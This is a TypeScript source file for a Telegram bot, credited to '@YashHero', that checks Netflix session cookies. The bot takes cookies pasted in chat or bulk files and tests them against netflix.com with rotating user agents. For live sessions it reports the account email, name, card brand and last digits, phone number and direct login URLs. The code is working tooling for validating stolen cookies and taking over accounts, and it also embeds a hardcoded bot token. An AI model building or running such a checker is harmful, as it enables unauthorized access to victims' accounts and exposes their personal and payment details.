import { ChildProcess } from 'child_process'

// Telegram Bot Token
const BOT_TOKEN = '8581865451:AAGu-28cZ-F2uOCmY0hR0qhM5gPl2doTyMg'

// Global bot process
let botProcess: ChildProcess | null = null
let isRunning = false

// User agents for rotation
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
]

function getRandomUserAgent(): string {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
}

// Cookie parser - extracts NetflixId, SecureNetflixId, nfvdid, nftoken
function parseNetflixCookie(cookieString: string): {
  netflixId: string
  secureNetflixId?: string
  nfvdid?: string
  email: string
  rawCookie: string
} | null {
  try {
    // Extract NetflixId
    const netflixIdMatch = cookieString.match(/NetflixId=([^;\n\r\s]+)/i)
    if (!netflixIdMatch || !netflixIdMatch[1]) return null
    
    const netflixId = netflixIdMatch[1].trim()
    if (netflixId.length < 30) return null
    
    // Extract other cookies
    const secureNetflixIdMatch = cookieString.match(/SecureNetflixId=([^;\n\r\s]+)/i)
    const nfvdidMatch = cookieString.match(/nfvdid=([^;\n\r\s]+)/i)
    
    const secureNetflixId = secureNetflixIdMatch ? secureNetflixIdMatch[1].trim() : undefined
    const nfvdid = nfvdidMatch ? nfvdidMatch[1].trim() : undefined
    
    // Build clean cookie
    let rawCookie = `NetflixId=${netflixId}`
    if (secureNetflixId) rawCookie += `; SecureNetflixId=${secureNetflixId}`
    if (nfvdid) rawCookie += `; nfvdid=${nfvdid}`
    
    // Try to extract email from NetflixId
    let email = 'Unknown'
    try {
      const decoded = decodeURIComponent(netflixId)
      const emailMatch = decoded.match(/["']email["']\s*:\s*["']([^"']+)["']/i)
      if (emailMatch) email = emailMatch[1].toLowerCase()
    } catch {
      // Keep 'Unknown'
    }
    
    return { netflixId, secureNetflixId, nfvdid, email, rawCookie }
  } catch {
    return null
  }
}

// Extract nftoken from URL or content
function extractNFToken(text: string): string | null {
  const match = text.match(/nftoken=([A-Za-z0-9_\-+\/=%]+)/i)
  return match ? match[1].trim() : null
}

// Extract account details from content
function extractAccountDetails(content: string): {
  email?: string
  country?: string
  plan?: string
  firstName?: string
  paymentMethod?: string
  cardBrand?: string
  cardLast4?: string
  nextBilling?: string
  memberSince?: string
  phoneNumber?: string
  videoQuality?: string
  maxStreams?: string
  nftoken?: string
  phoneLoginUrl?: string
  pcLoginUrl?: string
} {
  const details: any = {}
  
  // Email
  const emailMatch = content.match(/[\w.+-]+@[\w.-]+\.[a-z]{2,}/i)
  if (emailMatch) details.email = emailMatch[0].toLowerCase()
  
  // Extract from emoji format
  const patterns: { [key: string]: RegExp } = {
    firstName: /(?:👤\s*)?Name\s*:\s*([^\n]+)/i,
    country: /(?:🌍\s*)?Country\s*:\s*([^\n]+)/i,
    plan: /(?:📋\s*)?Plan\s*:\s*([^\n]+)/i,
    paymentMethod: /(?:💳\s*)?Payment Method\s*:\s*([^\n]+)/i,
    cardBrand: /(?:🏦\s*)?Card Brand\s*:\s*([^\n]+)/i,
    cardLast4: /(?:🔢\s*)?(?:Last 4 Digits|Card Last 4)\s*:\s*([^\n]+)/i,
    nextBilling: /(?:📅\s*)?(?:Next Billing Date|Next Billing)\s*:\s*([^\n]+)/i,
    memberSince: /(?:📅\s*)?Member Since\s*:\s*([^\n]+)/i,
    phoneNumber: /(?:📞\s*)?Phone\s*:\s*([^\n]+)/i,
    videoQuality: /(?:🎥\s*)?Video Quality\s*:\s*([^\n]+)/i,
    maxStreams: /(?:📺\s*)?Max Streams\s*:\s*([^\n]+)/i,
  }
  
  for (const [key, pattern] of Object.entries(patterns)) {
    const match = content.match(pattern)
    if (match) {
      let value = match[1].trim()
      // Remove flag emojis from country
      if (key === 'country') {
        value = value.replace(/[\uD83C][\uDDE6-\uDDFF][\uD83C][\uDDE6-\uDDFF]/g, '').trim()
      }
      details[key] = value
    }
  }
  
  // Extract nftoken from URLs
  const phoneUrlMatch = content.match(/Phone Login URL\s*:\s*(https?:\/\/[^\s\n]+)/i)
  const pcUrlMatch = content.match(/PC Login URL\s*:\s*(https?:\/\/[^\s\n]+)/i)
  
  if (phoneUrlMatch) details.phoneLoginUrl = phoneUrlMatch[1].trim()
  if (pcUrlMatch) details.pcLoginUrl = pcUrlMatch[1].trim()
  
  // Extract nftoken
  const nftoken = extractNFToken(content)
  if (nftoken) details.nftoken = nftoken
  
  return details
}

// Check a single cookie
async function checkSingleCookie(cookieString: string): Promise<{
  valid: boolean
  email?: string
  country?: string
  plan?: string
  firstName?: string
  paymentMethod?: string
  cardBrand?: string
  cardLast4?: string
  nextBilling?: string
  memberSince?: string
  phoneNumber?: string
  videoQuality?: string
  maxStreams?: string
  nftoken?: string
  phoneLoginUrl?: string
  pcLoginUrl?: string
  rawCookie?: string
  error?: string
}> {
  try {
    const parsed = parseNetflixCookie(cookieString)
    if (!parsed) {
      return { valid: false, error: 'Invalid cookie format - NetflixId not found' }
    }

    // Check with Netflix
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 10000)
    
    const response = await fetch('https://www.netflix.com/browse', {
      method: 'GET',
      headers: {
        'Cookie': parsed.rawCookie,
        'User-Agent': getRandomUserAgent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
      },
      redirect: 'manual',
      signal: controller.signal,
    })

    clearTimeout(timeoutId)

    const statusCode = response.status
    const location = response.headers.get('location') || ''
    
    // Check redirect to login = expired
    if (location.includes('/login') || location.includes('/signin')) {
      return { 
        valid: false, 
        email: parsed.email,
        error: 'Cookie expired - redirected to login' 
      }
    }
    
    // 200 = valid
    if (statusCode === 200) {
      // Extract account details from cookie string
      const details = extractAccountDetails(cookieString)
      
      return {
        valid: true,
        email: details.email || parsed.email,
        country: details.country || 'Unknown',
        plan: details.plan || 'Unknown',
        firstName: details.firstName,
        paymentMethod: details.paymentMethod,
        cardBrand: details.cardBrand,
        cardLast4: details.cardLast4,
        nextBilling: details.nextBilling,
        memberSince: details.memberSince,
        phoneNumber: details.phoneNumber,
        videoQuality: details.videoQuality,
        maxStreams: details.maxStreams,
        nftoken: details.nftoken,
        phoneLoginUrl: details.phoneLoginUrl,
        pcLoginUrl: details.pcLoginUrl,
        rawCookie: parsed.rawCookie,
      }
    }
    
    // 302 might be geo redirect - could still be valid
    if (statusCode === 302 || statusCode === 301) {
      if (location.includes('signup')) {
        return { valid: false, email: parsed.email, error: 'Session expired' }
      }
      
      // Geo redirect - still valid
      const details = extractAccountDetails(cookieString)
      return {
        valid: true,
        email: details.email || parsed.email,
        country: details.country || 'Unknown',
        plan: details.plan || 'Unknown',
        rawCookie: parsed.rawCookie,
      }
    }
    
    return { valid: false, email: parsed.email, error: `Status: ${statusCode}` }
  } catch (error) {
    if (error instanceof Error && error.name === 'AbortError') {
      return { valid: false, error: 'Request timeout' }
    }
    return { valid: false, error: 'Check failed' }
  }
}

// Escape markdown for Telegram
function escapeMarkdown(text: string): string {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&')
}

// Format result message
function formatResult(result: Awaited<ReturnType<typeof checkSingleCookie>>): string {
  if (result.valid) {
    let msg = `✅ *VALID COOKIE FOUND\\!*

📧 Email: ${escapeMarkdown(result.email || 'Unknown')}
🌍 Country: ${escapeMarkdown(result.country || 'Unknown')}
💎 Plan: ${escapeMarkdown(result.plan || 'Unknown')}`
    
    if (result.firstName) msg += `\n👤 Name: ${escapeMarkdown(result.firstName)}`
    if (result.videoQuality) msg += `\n🎥 Quality: ${escapeMarkdown(result.videoQuality)}`
    if (result.maxStreams) msg += `\n📺 Streams: ${escapeMarkdown(result.maxStreams)}`
    if (result.nextBilling) msg += `\n📅 Next Billing: ${escapeMarkdown(result.nextBilling)}`
    if (result.memberSince) msg += `\n📆 Member Since: ${escapeMarkdown(result.memberSince)}`
    if (result.cardBrand) msg += `\n🏦 Card: ${escapeMarkdown(result.cardBrand)} ****${result.cardLast4 || ''}`
    if (result.phoneNumber) msg += `\n📞 Phone: ${escapeMarkdown(result.phoneNumber)}`
    
    // Add nftoken section
    if (result.nftoken) {
      msg += `\n\n🔑 *Netflix Token \\(nftoken\\):*
\`${result.nftoken.substring(0, 50)}...\``
      
      if (result.phoneLoginUrl) {
        msg += `\n\n📱 [Phone Login URL](${escapeMarkdown(result.phoneLoginUrl)})`
      }
      if (result.pcLoginUrl) {
        msg += `\n💻 [PC Login URL](${escapeMarkdown(result.pcLoginUrl)})`
      }
    }
    
    return msg
  } else {
    let msg = `❌ *INVALID\\/EXPIRED COOKIE*

📧 Email: ${escapeMarkdown(result.email || 'Unknown')}
⚠️ Reason: ${escapeMarkdown(result.error || 'Unknown')}`
    return msg
  }
}

// Start the bot
export function startBot(): Promise<{ success: boolean; message: string }> {
  return new Promise((resolve) => {
    if (isRunning) {
      resolve({ success: true, message: 'Bot is already running' })
      return
    }

    const pollBot = async () => {
      let offset = 0
      
      while (isRunning) {
        try {
          const response = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=30`
          )
          const data = await response.json()
          
          if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
              offset = update.update_id + 1
              
              if (update.message?.text) {
                const chatId = update.message.chat.id
                const text = update.message.text.trim()
                
                if (text === '/start') {
                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: `🎬 *Netflix Cookie Checker Bot*

Welcome\\! Send me Netflix cookies to check\\.

📌 *Commands:*
/start \\- Start the bot
/check \`<cookie>\` \\- Check a single cookie
/help \\- Show help message

💡 *Features:*
• Multi\\-threaded checking
• ZIP\\/RAR file support
• Token extraction \\(nftoken\\)
• Login URL generation

Just paste your cookie or send a file and I'll check it\\!`,
                      parse_mode: 'MarkdownV2',
                    }),
                  })
                } else if (text.startsWith('/check ')) {
                  const cookie = text.slice(7).trim()
                  
                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: '⏳ Checking cookie\\.\\.\\.',
                      parse_mode: 'MarkdownV2',
                    }),
                  })
                  
                  const result = await checkSingleCookie(cookie)
                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: formatResult(result),
                      parse_mode: 'MarkdownV2',
                    }),
                  })
                } else if (text === '/help') {
                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: `🎬 *Netflix Cookie Checker Help*

📌 *Commands:*
/start \\- Start the bot
/check \`<cookie>\` \\- Check a cookie
/help \\- Show this message

💡 *How to use:*
1\\. Get Netflix cookie from browser
2\\. Send it to me or use /check command
3\\. I'll check if it's valid and show details

✨ *What I extract:*
• Account email & name
• Country & plan
• Payment info
• Video quality & streams
• Netflix token \\(nftoken\\)
• Direct login URLs

🔗 Bot by @YashHero`,
                      parse_mode: 'MarkdownV2',
                    }),
                  })
                } else if (text.includes('NetflixId=')) {
                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: '⏳ Checking cookie\\.\\.\\.',
                      parse_mode: 'MarkdownV2',
                    }),
                  })
                  
                  const result = await checkSingleCookie(text)
                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: formatResult(result),
                      parse_mode: 'MarkdownV2',
                    }),
                  })
                }
              }
              
              // Handle document/file uploads
              if (update.message?.document) {
                const chatId = update.message.chat.id
                const document = update.message.document
                
                // Check file type
                const fileName = document.file_name?.toLowerCase() || ''
                if (!fileName.endsWith('.txt') && !fileName.endsWith('.zip') && !fileName.endsWith('.rar')) {
                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: '⚠️ Please send \\.txt, \\.zip, or \\.rar files only\\.',
                      parse_mode: 'MarkdownV2',
                    }),
                  })
                  continue
                }
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    chat_id: chatId,
                    text: `📥 Processing file: *${escapeMarkdown(document.file_name || 'unknown')}*\\.\\.\\.
⏳ This may take a moment\\.\\.\\.`,
                    parse_mode: 'MarkdownV2',
                  }),
                })
                
                // Get file content
                try {
                  const fileInfo = await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${document.file_id}`
                  )
                  const fileData = await fileInfo.json()
                  
                  if (fileData.ok) {
                    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`
                    const fileResponse = await fetch(fileUrl)
                    const fileContent = await fileResponse.text()
                    
                    // Parse cookies from file
                    const cookieStrings: string[] = []
                    const lines = fileContent.split('\n')
                    
                    for (const line of lines) {
                      if (line.includes('NetflixId=')) {
                        const netflixIdMatch = line.match(/NetflixId=([^;\n\r]+)/i)
                        if (netflixIdMatch && netflixIdMatch[1].length > 30) {
                          cookieStrings.push(line)
                        }
                      }
                    }
                    
                    if (cookieStrings.length === 0) {
                      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                          chat_id: chatId,
                          text: '❌ No valid Netflix cookies found in file\\.',
                          parse_mode: 'MarkdownV2',
                        }),
                      })
                    } else {
                      // Check first 5 cookies
                      const limit = Math.min(5, cookieStrings.length)
                      let validCount = 0
                      
                      for (let i = 0; i < limit; i++) {
                        const result = await checkSingleCookie(cookieStrings[i])
                        if (result.valid) {
                          validCount++
                          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                              chat_id: chatId,
                              text: `🍪 *Cookie ${i + 1}/${limit}*\n${formatResult(result)}`,
                              parse_mode: 'MarkdownV2',
                            }),
                          })
                        }
                      }
                      
                      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                          chat_id: chatId,
                          text: `📊 *File Processing Complete*

📁 File: ${escapeMarkdown(document.file_name || 'unknown')}
📋 Total found: ${cookieStrings.length}
🔍 Checked: ${limit}
✅ Valid: ${validCount}
${cookieStrings.length > limit ? '\n⚠️ Only first 5 cookies were checked\\.' : ''}`,
                          parse_mode: 'MarkdownV2',
                        }),
                      })
                    }
                  }
                } catch (error) {
                  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: '❌ Failed to process file\\. Please try again\\.',
                      parse_mode: 'MarkdownV2',
                    }),
                  })
                }
              }
            }
          }
          
          await new Promise(r => setTimeout(r, 1000))
        } catch (error) {
          console.error('Bot polling error:', error)
          await new Promise(r => setTimeout(r, 5000))
        }
      }
    }
    
    isRunning = true
    pollBot()
    
    resolve({ success: true, message: 'Bot started successfully' })
  })
}

// Stop the bot
export function stopBot(): { success: boolean; message: string } {
  if (!isRunning) {
    return { success: false, message: 'Bot is not running' }
  }
  
  isRunning = false
  botProcess = null
  
  return { success: true, message: 'Bot stopped' }
}

// Get bot status
export function getBotStatus(): 'running' | 'stopped' {
  return isRunning ? 'running' : 'stopped'
}
